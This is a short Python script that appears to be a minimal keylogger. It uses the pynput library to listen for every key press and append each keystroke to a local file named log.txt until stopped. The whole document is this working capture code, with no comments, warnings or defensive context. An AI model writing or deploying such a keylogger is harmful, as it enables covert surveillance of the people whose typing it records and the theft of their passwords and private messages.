from pynput.keyboard import Listener

def press(key):
    with open("log.txt", 'a') as f:
        f.write(str(key))

with Listener(on_press=press) as listener:
    listener.join() 